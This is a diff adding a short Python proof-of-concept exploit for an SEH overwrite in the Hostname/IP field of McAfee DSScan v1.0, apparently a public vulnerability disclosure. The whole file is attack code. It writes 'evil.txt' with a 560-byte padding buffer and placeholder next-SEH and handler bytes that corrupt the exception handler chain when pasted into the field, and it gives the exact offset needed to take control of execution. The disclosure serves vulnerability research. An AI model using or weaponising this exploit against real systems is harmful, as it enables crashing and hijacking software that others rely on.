@@ -1,0 +1,30 @@
+#!/usr/bin/python
+# Exploit Title     : DSScan v1.0 Hostname/IP Field SEH Overwrite POC
+# Discovery by      : Anurag Srivastava
+# Email             : anurag.srivastava@pyramidcyber.com
+# Website	    : http://pyramidcyber.com/
+# Discovery Date    : 18/08/2017
+# Software Link     : https://www.mcafee.com/in/downloads/free-tools/dsscan.aspx#
+# Tested Version    : 1.00
+# Vulnerability Type: SEH Overwrite POC
+# Tested on OS      : Windows 10 Home x64 
+# Steps to Reproduce: Copy contents of evil.txt file and paste in the Hostname/IP Field. Press ->
+##########################################################################################
+#  -----------------------------------NOTES----------------------------------------------#
+##########################################################################################
+ 
+#SEH chain of main thread
+#Address    SE handler
+#0019F900   43434343
+#42424242   *** CORRUPT ENTRY ***
+
+ 
+# Offset to the SEH Frame is 560
+buffer = "A"*560
+# Address of the Next SEH Frame
+nseh = "B"*4
+# Address to the Handler Code
+seh = "C" *4
+f = open("evil.txt", "wb")
+f.write(buffer+nseh+seh)
+f.close()
